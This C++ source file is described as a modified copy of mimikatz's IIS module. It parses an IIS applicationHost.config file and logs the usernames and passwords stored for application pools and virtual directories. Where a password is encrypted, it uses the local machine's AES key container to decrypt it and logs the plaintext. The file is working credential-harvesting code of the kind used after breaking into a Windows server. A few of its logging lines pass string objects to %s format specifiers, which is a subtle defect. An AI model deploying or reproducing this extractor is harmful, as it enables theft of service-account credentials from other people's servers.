/*	
    Slightly modified version of https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/kuhl_m_iis.c

    Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/

#include "iis.h"
#include "xml.h"
#include "debug.h"
#include "utils.h"

#pragma comment(lib, "Crypt32.lib")

BOOL parse_iis_apphost(std::string filename, BOOL isLocal)
{
	IXMLDOMDocument* pXMLDom;

	if(filename.length() > 0){

		if (pXMLDom = CreateAndInitDOM())
		{
			std::wstring ws(filename.begin(), filename.end());
			if (LoadXMLFile(pXMLDom, ws.c_str()))
			{
				DebugFprintf(outlogfile, PRINT_INFO1, "\n\t[*] IIS Configuration\n");

				iis_apphost_genericEnumNodes( pXMLDom, L"//configuration/system.applicationHost/applicationPools/add", IISXMLType_ApplicationPools, NULL, NULL, 0, isLocal);
				iis_apphost_genericEnumNodes( pXMLDom, L"//configuration/system.applicationHost/sites/site", IISXMLType_Sites, NULL, NULL, 0, isLocal);
				iis_apphost_genericEnumNodes(pXMLDom, L"//configuration/location", IISXMLType_Locations, NULL, NULL, 0, isLocal);

			}
			else {
				DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] IIS configuration file does not exist\n");
			}
			ReleaseDom(pXMLDom);
		}
		else {
			DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error creating XML DOM\n");
		}
	}
	else 
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] No path given for applicationHost.config\n");

	return TRUE;
}

void iis_apphost_genericEnumNodes(IXMLDOMDocument* pXMLDom, PCWSTR path, IISXMLType xmltype, LPCWSTR provider, LPCBYTE data, DWORD szData, BOOL isLocal)
{
	IXMLDOMNodeList* pNodes;
	IXMLDOMNode* pNode;
	DOMNodeType type;
	BOOL mustBreak = FALSE;
	long length, i;

	if ((pXMLDom->selectNodes((BSTR)path, &pNodes) == S_OK) && pNodes)
	{
		if (pNodes->get_length(&length) == S_OK)
		{
			for (i = 0; (i < length) && !mustBreak; i++)
			{
				if ((pNodes->get_item(i, &pNode) == S_OK) && pNode)
				{
					if ((pNode->get_nodeType(&type) == S_OK) && (type == NODE_ELEMENT))
					{
						switch (xmltype)
						{
							case IISXMLType_ApplicationPools:
								iis_apphost_apppool(pXMLDom, pNode, isLocal);
								break;
							case IISXMLType_Sites:
								iis_apphost_site(pXMLDom, pNode, isLocal);
								break;
							case IISXMLType_Locations:
								iis_apphost_locations(pXMLDom, pNode);
								break;
						    case IISXMLType_Providers:
						    	mustBreak = iis_apphost_provider(pXMLDom, pNode, provider, data, szData, isLocal);
								break;
						}
					}
					pNode->Release();
				}
			}
		}
	}
}

void iis_apphost_locations(IXMLDOMDocument* pXMLDom, IXMLDOMNode* pNode)
{
	std::string gen;
	gen = getAttribute(pNode, "path");
	if (gen.length() > 0)
	{
		DebugFprintf(outlogfile, PRINT_INFO1, "\t[*] Location Path: \'%s\'\n", gen.c_str());
	}
}

void iis_apphost_apppool( IXMLDOMDocument* pXMLDom, IXMLDOMNode* pNode, BOOL isLocal)
{
	std::string gen;
	IXMLDOMNode* pProcessModelNode;

	gen = getAttribute(pNode, "name");
	if (gen.length() > 0)
	{
		DebugFprintf(outlogfile, PRINT_INFO1, "\t[*] ApplicationPool: \'%s\'\n", gen.c_str());
		if ((pNode->selectSingleNode(L"processModel", &pProcessModelNode) == S_OK) && pProcessModelNode)
		{
			gen = getAttribute(pProcessModelNode, "userName");
			if (gen.length() > 0)
			{
				DebugFprintf(outlogfile, PRINT_INFO1, "\t\tUsername: %s\n", gen.c_str());
				gen = getAttribute(pProcessModelNode, "password");
				if (gen.length() > 0)
				{
					DebugFprintf(outlogfile, PRINT_INFO1, "\t\tPassword: %s\n", gen.c_str());

					std::wstring ws(gen.begin(), gen.end());
					iis_maybeEncrypted(pXMLDom, ws.c_str(), isLocal);
				}
			}
		}
	}
}

void iis_apphost_site(IXMLDOMDocument* pXMLDom, IXMLDOMNode* pNode, BOOL isLocal)
{
	std::string gen;
	IXMLDOMNodeList* pAppNodes, * pVdirNodes, * pBindingNodes;
	IXMLDOMNode* pAppNode, * pVdirNode, * pBindingNode;
	IXMLDOMNode* pBindingsNode;
	DOMNodeType type;
	long lengthApp, lengthVdir, lengthBindings, i, j;

	gen = getAttribute(pNode, "name");
	if (gen.length() > 0)
	{
		DebugFprintf(outlogfile, PRINT_INFO1, "\n\t[+] Site: \'%s\'\n", gen.c_str());
		if ((pNode->selectNodes(L"application", &pAppNodes) == S_OK) && pAppNodes)
		{
			if (pAppNodes->get_length(&lengthApp) == S_OK)
			{
				for (i = 0; i < lengthApp; i++)
				{
					if ((pAppNodes->get_item( i, &pAppNode) == S_OK) && pAppNode)
					{
						if ((pAppNode->get_nodeType( &type) == S_OK) && (type == NODE_ELEMENT))
						{
							gen = getAttribute(pAppNode, "path");
							if (gen.length() > 0)
							{
								DebugFprintf(outlogfile, PRINT_INFO1, "\t  > Application Path: %s\n", gen.c_str());

								if ((pAppNode->selectNodes( L"virtualDirectory", &pVdirNodes) == S_OK) && pVdirNodes)
								{
									if (pVdirNodes->get_length(&lengthVdir) == S_OK)
									{
										for (j = 0; j < lengthVdir; j++)
										{
											if ((pVdirNodes->get_item(j, &pVdirNode) == S_OK) && pVdirNode)
											{
												if ((pVdirNode->get_nodeType(&type) == S_OK) && (type == NODE_ELEMENT))
												{
													gen = getAttribute(pAppNode, "path");
													if (gen.length() > 0)
													{
														DebugFprintf(outlogfile, PRINT_INFO1, "\t    - VirtualDirectory Path: %s ( ", gen.c_str());

														gen = getAttribute(pVdirNode, "physicalPath");
														if (gen.length() > 0)														{
															DebugFprintf(outlogfile, PRINT_INFO1, "%s", gen.c_str());
														}
														DebugFprintf(outlogfile, PRINT_INFO1, " )\n");

														gen = getAttribute(pVdirNode, "userName");
														if (gen.length() > 0)
														{
															DebugFprintf(outlogfile, PRINT_INFO1, "\t      Username: %s\n", gen.c_str());
															gen = getAttribute(pVdirNode, "password");
															if (gen.length() > 0)
															{
																DebugFprintf(outlogfile, PRINT_INFO1, "\t\t      Password: %s\n", gen.c_str());
																std::wstring ws(gen.begin(), gen.end());
																iis_maybeEncrypted(pXMLDom, ws.c_str(), isLocal);
															}
														}
													}
												}
												pVdirNode->Release();
											}
										}
									}
								}
							}
						}
						pAppNode->Release();
					}
				}
			}
		}


		if ((pNode->selectSingleNode(L"bindings", &pBindingsNode) == S_OK) && pBindingsNode)
		{
			if ((pBindingsNode->selectNodes(L"binding", &pBindingNodes) == S_OK) && pBindingNodes)
			{

				if (pBindingNodes->get_length(&lengthBindings) == S_OK)
				{
					for (j = 0; j < lengthBindings; j++)
					{

						if ((pBindingNodes->get_item(j, &pBindingNode) == S_OK) && pBindingNode)
						{
							if ((pBindingNode->get_nodeType(&type) == S_OK) && (type == NODE_ELEMENT))
							{
								gen = getAttribute(pBindingNode, "bindingInformation");
								if (gen.length() > 0)
								{
									DebugFprintf(outlogfile, PRINT_INFO1, "\t[*] Binding: %s\n", gen.c_str());
								}
							}
						}


					}
				}

			}
		
		}
	}
}

BOOL quick_base64_to_Binary(PCWSTR base64, PBYTE* data, DWORD* szData)
{
	BOOL status = FALSE;
	*data = NULL;
	*szData = 0;
	if (CryptStringToBinaryW(base64, 0, CRYPT_STRING_BASE64, NULL, szData, NULL, NULL))
	{
		if (*data = (PBYTE)LocalAlloc(LPTR, *szData))
		{
			status = CryptStringToBinaryW(base64, 0, CRYPT_STRING_BASE64, *data, szData, NULL, NULL);
			if (!status)
				*data = (PBYTE)LocalFree(*data);
		}
	}
	return status;
}

void iis_maybeEncrypted(IXMLDOMDocument* pXMLDom, PCWSTR password, BOOL isLocal)
{
	BOOL status = FALSE;
	size_t passwordLen = wcslen(password), providerLen, dataLen;
	PCWCHAR pBeginProvider, pEndProvider, pBeginData, pEndData;
	PWCHAR provider, data;
	PBYTE binaryData;
	DWORD binaryDataLen;

	if (passwordLen > 10) // [enc:*:enc], and yes, I don't check all
	{
		if ((_wcsnicmp(password, L"[enc:", 5) == 0) && (_wcsnicmp(password + (passwordLen - 5), L":enc]", 5) == 0))
		{
			pBeginProvider = password + 5;
			pEndProvider = wcschr(password + 5, L':');
			providerLen = (PBYTE)pEndProvider - (PBYTE)pBeginProvider;
			if (pEndProvider != (password + (passwordLen - 5)))
			{
				pBeginData = pEndProvider + 1;
				pEndData = password + (passwordLen - 5);
				dataLen = (PBYTE)pEndData - (PBYTE)pBeginData;
				if (provider = (PWCHAR)LocalAlloc(LPTR, providerLen + sizeof(wchar_t)))
				{
					RtlCopyMemory(provider, pBeginProvider, providerLen);
					if (data = (PWCHAR)LocalAlloc(LPTR, dataLen + sizeof(wchar_t)))
					{
						RtlCopyMemory(data, pBeginData, dataLen);

						std::wstring prov_w(provider);
						std::string prov_s = ws2s(prov_w);
						//std::string prov_s(prov_w.begin(), prov_w.end());

						std::wstring data_w(data);
						std::string data_s = ws2s(data_w);
						//std::string data_s(data_w.begin(), data_w.end());

						DebugFprintf(outlogfile, PRINT_INFO1, "\t\t      Provider  : %s\n\t\t      Data      : %s\n", prov_s.c_str(), data_s.c_str());

						if (quick_base64_to_Binary(data, &binaryData, &binaryDataLen))
						{
							iis_apphost_genericEnumNodes(pXMLDom, L"//configuration/configProtectedData/providers/add", IISXMLType_Providers, provider, binaryData, binaryDataLen, isLocal);
							LocalFree(binaryData);
						}
						LocalFree(data);
					}
					LocalFree(provider);
				}
			}
		}
	}
}

BOOL iis_apphost_provider( IXMLDOMDocument* pXMLDom, IXMLDOMNode* pNode, LPCWSTR provider, LPCBYTE data, DWORD szData, BOOL isLocal)
{
	BOOL status = FALSE, isMachine = FALSE;
	std::string name, type, keyContainerName, useMachineContainer, sessionKey;
	PBYTE binaryData;
	DWORD binaryDataLen;

	name = getAttribute(pNode, "name");
	if (name.length() > 0)
	{
		std::wstring ws(name.begin(), name.end());
		if (status = _wcsicmp(ws.c_str(), provider) == 0)
		{
			type = getAttribute(pNode, "type");
			if (type.length() > 0)
			{
				std::wstring wtype(type.begin(), type.end());
				if (_wcsicmp(wtype.c_str(), L"Microsoft.ApplicationHost.AesProtectedConfigurationProvider") == 0)
				{
					keyContainerName = getAttribute(pNode, "keyContainerName");
					if (keyContainerName.length() > 0)
					{
						DebugFprintf(outlogfile, PRINT_INFO1, "\t\t      KeyName   : %s\n", keyContainerName);
						sessionKey = getAttribute(pNode, "sessionKey");
						if (sessionKey.length() > 0)
						{
							DebugFprintf(outlogfile, PRINT_INFO1, "\t\t      SessionKey: %s\n", sessionKey);
							useMachineContainer = getAttribute(pNode, "useMachineContainer");
							if (useMachineContainer.length() > 0)
							{
								std::wstring ws_machine(useMachineContainer.begin(), useMachineContainer.end());
								isMachine = (_wcsicmp(ws_machine.c_str(), L"true") == 0);
							}

							std::wstring ws_sess(sessionKey.begin(), sessionKey.end());
							if (quick_base64_to_Binary(ws_sess.c_str(), &binaryData, &binaryDataLen))
							{
								std::wstring ws_cont(keyContainerName.begin(), keyContainerName.end());
								iis_apphost_provider_decrypt(ws_cont.c_str(), isMachine, binaryData, binaryDataLen, data, szData, isLocal);
							}
						}
					}
				}
				else /*if ... */
				{
					DebugFprintf(outlogfile, PRINT_ERROR, "\t\t      [-] type is not supported (%s)\n", wtype);
				}
			}
			else
			{
				// TODO direct decryption without session key
			}
		}
	}
	return status;
}

void iis_apphost_provider_decrypt(PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData, BOOL isLocal)
{
	//BOOL isLive = FALSE;
	PBYTE liveData;
	DWORD szLiveData, szPvk;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey = 0, hSessionKey;


	if (isLocal)
	{
		if (liveData = (PBYTE)LocalAlloc(LPTR, szData))
		{
			RtlCopyMemory(liveData, data, szData);
			szLiveData = szData;

			if (CryptAcquireContextW(&hProv, isLocal ? keyContainerName : NULL, MS_ENH_RSA_AES_PROV_W, PROV_RSA_AES, (isLocal ? 0 : CRYPT_VERIFYCONTEXT)  | (isMachine ? CRYPT_MACHINE_KEYSET : 0)))
			{

				if (isLocal || hKey)
				{
					if (CryptImportKey(hProv, sessionKey, szSessionKey, hKey, 0, &hSessionKey))
					{
						if (CryptDecrypt(hSessionKey, 0, FALSE, 0, liveData, &szLiveData))
						{
							std::wstring pw_w((PCWSTR)(liveData + sizeof(DWORD)));
							std::string pw_s = ws2s(pw_w);
							//std::string pw_s(pw_w.begin(), pw_w.end());
							//wprintf(L"Password  : % s\n", liveData + sizeof(DWORD));
							DebugFprintf(outlogfile, PRINT_INFO1, "\t\t      Decrypted : %s\n", pw_s.c_str() /*CRC32 ? Random ?*/);
						}
						else 
							DebugFprintf(outlogfile, PRINT_ERROR, "\t\t      [-] CryptDecrypt Failed.: %x\n", GetLastError());

						CryptDestroyKey(hSessionKey);
					}
					else 
						DebugFprintf(outlogfile, PRINT_ERROR, "\t\t      [-] CryptImportKey (session) Failed: %x\n", GetLastError());
				}
				if (!isLocal)
				{
					if (hKey)
						CryptDestroyKey(hKey);
				}
				CryptReleaseContext(hProv, 0);
			}
			else 
				DebugFprintf(outlogfile, PRINT_ERROR, "\t\t      [-] CryptAcquireContext Failed: %x\n", GetLastError());

			LocalFree(liveData);
		}
	}
}